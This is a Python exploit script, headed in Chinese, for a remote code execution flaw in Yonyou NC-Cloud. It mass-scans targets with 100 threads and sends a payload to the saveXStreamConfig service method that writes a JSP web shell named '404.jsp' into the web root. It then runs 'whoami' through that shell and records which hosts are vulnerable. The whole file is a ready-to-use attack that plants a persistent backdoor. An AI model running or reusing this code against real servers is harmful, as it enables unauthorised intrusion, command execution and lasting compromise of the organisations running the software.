# 用友/用友-NC-Cloud远程代码执行
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """    _   _  ____       ____ _                 
 | \ | |/ ___|     / ___| | ___  _   _  __| |
 |  \| | |   _____| |   | |/ _ \| | | |/ _` |
 | |\  | |__|_____| |___| | (_) | |_| | (_| |
 |_| \_|\____|     \____|_|\___/ \__,_|\__,_|
                                             
                                version:1.0.8 
                                author:guoguo12138                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="用友/用友-NC-Cloud远程代码执行")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
         poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
                
def poc(target):
    path = "/rep/login"
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
    }
    shell_text = '404.jsp'
    data = {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/"+shell_text+""]}
    try:
            res  = requests.post(url=target,headers=headers,json=data,timeout=10)
            if res:
                data = 'cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())'
                res_cmd = requests.post(url=target+'/'+shell_text+'?error=bsh.Interpreter',data=data,headers=headers,verify=False)
            if res_cmd.status_code == 200 and "xml version='1.0'" in res_cmd.text:
                print(f"[+该url存在漏洞{target}")
                with open('try006.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
                    return True
            else:
                print(f"该url不存在漏洞{target}")
                return False
    except Exception as e:
        print(f"该url连接存在问题{target}")
        return False

if __name__ == '__main__':
    main()
